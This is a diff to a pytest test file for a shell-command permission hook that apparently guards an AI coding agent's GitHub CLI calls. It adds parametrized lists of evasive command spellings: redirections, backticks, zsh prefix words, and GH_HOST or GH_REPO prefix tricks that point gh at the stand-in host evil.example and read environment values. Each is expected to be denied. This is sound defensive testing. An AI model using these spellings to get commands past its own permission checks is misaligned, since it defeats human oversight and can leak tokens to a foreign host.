@@ -9,6 +9,7 @@ import io
 import json
 import subprocess
 import sys
+import time
 from pathlib import Path
 
 import pytest
@@ -37,68 +38,86 @@ def test_the_decider_decodes_stdin_the_way_it_decodes_argv(monkeypatch, raw):
     assert mod.main(["gh-guard-decide.py"]) == 10
 
 
-@pytest.mark.parametrize(
-    "cmd",
-    [
-        f"echo ok # note\n{G}",  # a trailing comment must not join the next line onto this one
-        f"echo ok # note\n{GR}",
-        f"# note\n{G}",
-        f"echo `{G}`",  # backtick command substitution
-        f"x=`{GR}`",
-        f"# <<EOF\n{G}",  # a heredoc marker in a comment is not a heredoc
-        f"echo ok # <<EOF\n{G}",
-        f"echo \\<<EOF\n{G}",  # nor after a backslash
-        f'echo "first\nsee <<EOF here\nend"\n{G}',  # nor inside a multi-line quoted string
-        f"echo 'first\nsee <<EOF here\nend'\n{G}",
-        f"echo $((a << b))\n{G}",  # nor an arithmetic shift
-        f"echo $((a << b))\n{G}\nb",
-        "gh pr list -R git@evil.example:o/r.git --search x",  # scp-style host
-        "gh pr list --repo=git@evil.example:o/r",
-        "gh pr list -Rgit@evil.example:o/r",
-        "gh repo view git@evil.example:o/r",
-        "GH_HOST=evil.example gh pr list -R o/r --search x",  # a GH_HOST prefix names the host
-        "env GH_HOST=evil.example gh pr list -R o/r --search x",
-        "GH_HOST=evil.example.com gh pr list",  # the host alone, with no -R beside it
-        "env GH_HOST=evil.example.com gh pr list",
-        "GH_REPO=evil.example.com/o/r gh pr list",  # GH_REPO is [HOST/]OWNER/REPO: the same reach as -R
-        "env GH_REPO=evil.example.com/o/r gh pr view 1",
-        "GH_HOST+=evil.example.com gh pr list",  # += puts the value in the environment too
-        "GH_REPO+=evil.example.com/o/r gh pr list",
-        "A+=1 gh pr list --json number --jq env.X",  # a += prefix on any name must not hide the call
-        "A[0]=1 gh pr list --json number --jq env.X",  # bash runs a subscripted prefix too
-        "A[0]+=1 gh pr list --json number --jq env.X",
-        f">/dev/null {G}",  # the shell opens a redirection before the command word, then runs the call
-        f"2>&1 {G}",
-        f"</dev/null {G}",
-        f"A=1 2>/dev/null {G}",
-        f"&>/dev/null {G}",
-        f"{{fd}}>/dev/null {G}",
-        f">/dev/null {GR}",
-        f"true;>f {G}",  # the lexer fuses `;>` into one token
-        f"true&&>f {G}",
-        f"(>f {G})",
-        f">|f {G}",  # clobber redirect
-        f"2>|f {G}",
-        f"A='x\ny' {G}",  # a newline inside a quoted assignment value
-        f'A["x y"]=1 {G}',  # whitespace in a subscript
-        f"noglob {G}",  # words zsh (and bash 4) run the next word behind
-        f"nocorrect noglob {G}",
-        f"repeat 1 {G}",
-        f"coproc {G}",
-        "GH_HOST=evil.example.com GH_HOST+= gh pr list",  # += appends: the host stays evil
-        "GH_HOST=evil.example.com GH_HOST+=github.com gh pr list",
-        "GH_REPO=evil.example.com/o/r GH_REPO+= gh pr list",
-        "GH_HOST=evil.example.com GH_HOST[0]=github.com gh pr list",  # a subscript write must not launder it
-        "GH_REPO=evil.example.com/o/r GH_REPO[0]=github.com/o/r gh pr list",
-        "GH_HOST[0]=github.com gh pr list",  # bash and zsh read a subscripted GH_HOST differently: denied
-        "GH_HOST=git GH_HOST+=hub.com gh pr list",  # zsh reads github.com, bash 3.2 reads hub.com: `git` is foreign
-        "GH_HOST=evil.example.com GH_HOST=github.com gh pr list",  # a later prefix does not launder an earlier one
-        "A[$(true)]=1 gh pr list --json number --jq env.X",  # the lexer splits a subscript at `$(`
-        f"repeat $n {G}",  # zsh `repeat` takes any count word
-        f"repeat 1+1 {G}",
-        f"echo don't `{G}`",  # quoting the tokenizer cannot follow: the lenient split still sees the backtick call
-    ],
-)
+# `&>file` is one redirection operator, and a `GH_HOST[i]=` prefix names a host the shell will use.
+REDIRECT_AND_SUBSCRIPT_SHAPES = [
+    "gh pr list --json number &>/dev/null --jq env.X",
+    "gh pr list --json number &> /dev/null --jq env.X",
+    "gh pr list &>/dev/null -R evil.example.com/o/r --search x",
+    "gh pr list &>>/dev/null --hostname evil.example.com",
+    "gh pr list &>/dev/null --web",
+    "gh pr list --json number &>|/dev/null --jq env.X",  # zsh clobber forms
+    "gh pr list --json number &>>|/dev/null --jq env.X",
+    "GH_HOST=evil.example.com &>/dev/null gh pr list",
+    "GH_REPO=evil.example.com/o/r &>/dev/null gh pr view 1",
+    "env GH_HOST=evil.example.com &>/dev/null gh pr list",
+    "GH_HOST[0]=evil.example.com gh pr list",
+    "GH_REPO[0]=evil.example.com/o/r gh pr list",
+    "GH_HOST[0]=github.com gh pr list",  # a subscripted prefix is denied whatever it names: its value is not tracked
+]
+
+DENY_SPELLINGS = [
+    f"echo ok # note\n{G}",  # a trailing comment must not join the next line onto this one
+    f"echo ok # note\n{GR}",
+    f"# note\n{G}",
+    f"echo `{G}`",  # backtick command substitution
+    f"x=`{GR}`",
+    f"# <<EOF\n{G}",  # a heredoc marker in a comment is not a heredoc
+    f"echo ok # <<EOF\n{G}",
+    f"echo \\<<EOF\n{G}",  # nor after a backslash
+    f'echo "first\nsee <<EOF here\nend"\n{G}',  # nor inside a multi-line quoted string
+    f"echo 'first\nsee <<EOF here\nend'\n{G}",
+    f"echo $((a << b))\n{G}",  # nor an arithmetic shift
+    f"echo $((a << b))\n{G}\nb",
+    "gh pr list -R git@evil.example:o/r.git --search x",  # scp-style host
+    "gh pr list --repo=git@evil.example:o/r",
+    "gh pr list -Rgit@evil.example:o/r",
+    "gh repo view git@evil.example:o/r",
+    "GH_HOST=evil.example gh pr list -R o/r --search x",  # a GH_HOST prefix names the host
+    "env GH_HOST=evil.example gh pr list -R o/r --search x",
+    "GH_HOST=evil.example.com gh pr list",  # the host alone, with no -R beside it
+    "env GH_HOST=evil.example.com gh pr list",
+    "GH_REPO=evil.example.com/o/r gh pr list",  # GH_REPO is [HOST/]OWNER/REPO: the same reach as -R
+    "env GH_REPO=evil.example.com/o/r gh pr view 1",
+    "GH_HOST+=evil.example.com gh pr list",  # += puts the value in the environment too
+    "GH_REPO+=evil.example.com/o/r gh pr list",
+    "A+=1 gh pr list --json number --jq env.X",  # a += prefix on any name must not hide the call
+    "A[0]=1 gh pr list --json number --jq env.X",  # bash runs a subscripted prefix too
+    "A[0]+=1 gh pr list --json number --jq env.X",
+    f">/dev/null {G}",  # the shell opens a redirection before the command word, then runs the call
+    f"2>&1 {G}",
+    f"</dev/null {G}",
+    f"A=1 2>/dev/null {G}",
+    f"&>/dev/null {G}",
+    f"{{fd}}>/dev/null {G}",
+    f">/dev/null {GR}",
+    f"true;>f {G}",  # the lexer fuses `;>` into one token
+    f"true&&>f {G}",
+    f"(>f {G})",
+    f">|f {G}",  # clobber redirect
+    f"2>|f {G}",
+    f"A='x\ny' {G}",  # a newline inside a quoted assignment value
+    f'A["x y"]=1 {G}',  # whitespace in a subscript
+    f"noglob {G}",  # words zsh (and bash 4) run the next word behind
+    f"nocorrect noglob {G}",
+    f"repeat 1 {G}",
+    f"coproc {G}",
+    "GH_HOST=evil.example.com GH_HOST+= gh pr list",  # += appends: the host stays evil
+    "GH_HOST=evil.example.com GH_HOST+=github.com gh pr list",
+    "GH_REPO=evil.example.com/o/r GH_REPO+= gh pr list",
+    "GH_HOST=evil.example.com GH_HOST[0]=github.com gh pr list",  # a subscript write must not launder it
+    "GH_REPO=evil.example.com/o/r GH_REPO[0]=github.com/o/r gh pr list",
+    "GH_HOST[0]=github.com gh pr list",  # bash and zsh read a subscripted GH_HOST differently: denied
+    "GH_HOST=git GH_HOST+=hub.com gh pr list",  # zsh reads github.com, bash 3.2 reads hub.com: `git` is foreign
+    "GH_HOST=evil.example.com GH_HOST=github.com gh pr list",  # a later prefix does not launder an earlier one
+    "A[$(true)]=1 gh pr list --json number --jq env.X",  # the lexer splits a subscript at `$(`
+    f"repeat $n {G}",  # zsh `repeat` takes any count word
+    f"repeat 1+1 {G}",
+    f"echo don't `{G}`",  # quoting the tokenizer cannot follow: the lenient split still sees the backtick call
+    *REDIRECT_AND_SUBSCRIPT_SHAPES,
+]
+
+
+@pytest.mark.parametrize("cmd", DENY_SPELLINGS)
 def test_spellings_the_shell_reads_differently_are_denied(cmd):
     assert verdict(cmd) == "deny", cmd
 
@@ -115,6 +134,8 @@ def test_spellings_the_shell_reads_differently_are_denied(cmd):
         "2>&1 gh pr list --json number --jq .[].number",
         ">/dev/null gh pr list --json number",
         "gh pr list --json number >/dev/null 2>&1",
+        "gh pr list --json number &>/dev/null",
+        "gh pr list --json number --jq .[].number &>/dev/null",
         "GH_HOST=github.com GH_HOST+= gh pr list",
         "GH_HOST+=github.com gh pr list",
         "repeat 2 gh pr list --json number --jq .[].number",
@@ -128,7 +149,7 @@ def test_ordinary_calls_stay_allowed(cmd):
     assert verdict(cmd) == "allow", cmd
 
 
-def _hook(tmp_path: Path, cmd: str, allow: list[str]) -> str:
+def _hook(tmp_path: Path, cmd: str, allow: list[str], path: str = "/usr/bin:/bin") -> str:
     (tmp_path / ".claude").mkdir(exist_ok=True)
     (tmp_path / ".claude" / "settings.json").write_text(
         json.dumps({"permissions": {"allow": allow}})
@@ -139,7 +160,7 @@ def _hook(tmp_path: Path, cmd: str, allow: list[str]) -> str:
         capture_output=True,
         text=True,
         cwd=tmp_path,
-        env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
+        env={"HOME": str(tmp_path), "PATH": path},
         timeout=20,
     )
     return (
@@ -185,3 +206,35 @@ def test_the_hook_forwards_a_host_with_no_other_trigger(tmp_path, cmd, grant):
 
 def test_a_quote_split_command_word_is_still_gh_under_a_bare_bash_grant(tmp_path):
     assert _hook(tmp_path, 'g"h" pr list --json number --jq env.X', ["Bash"]) == "deny"
+
+
+@pytest.mark.parametrize("cmd", REDIRECT_AND_SUBSCRIPT_SHAPES)
+def test_the_hook_denies_the_redirect_and_subscript_shapes_end_to_end(tmp_path, cmd):
+    assert _hook(tmp_path, cmd, ["Bash"]) == "deny", cmd
+
+
+@pytest.mark.parametrize("cmd", DENY_SPELLINGS)
+def test_the_hook_routes_every_spelling_the_decider_denies_to_the_decider(tmp_path, cmd):
+    """The prefilter decides what reaches the decider: a decider deny that is never asked for is an allow.
+
+    A python3 that always answers "deny" stands in for the decider, so only the routing is under test."""
+    shim = tmp_path / "shim"
+    shim.mkdir()
+    (shim / "python3").write_text("#!/bin/sh\nexit 10\n")
+    (shim / "python3").chmod(0o755)
+    assert _hook(tmp_path, cmd, ["Bash"], path=f"{shim}:/usr/bin:/bin") == "deny", cmd
+
+
+@pytest.mark.parametrize(
+    "command,seconds",
+    [
+        ("GH_HOST=evil.example.com " * 40000 + "gh pr list", 5),
+        ("GH_HOST=evil.example.com " + "GH_HOST+=a " * 40000 + "gh pr list", 10),
+    ],
+    ids=["repeated-prefixes", "append-flood"],
+)
+def test_a_flood_of_prefix_assignments_is_denied_in_linear_time(command, seconds):
+    """Uncapped, the first took about 20 s and the second 44 s and 569 MB: past any hook time limit."""
+    start = time.perf_counter()
+    assert verdict(command) == "deny"
+    assert time.perf_counter() - start < seconds
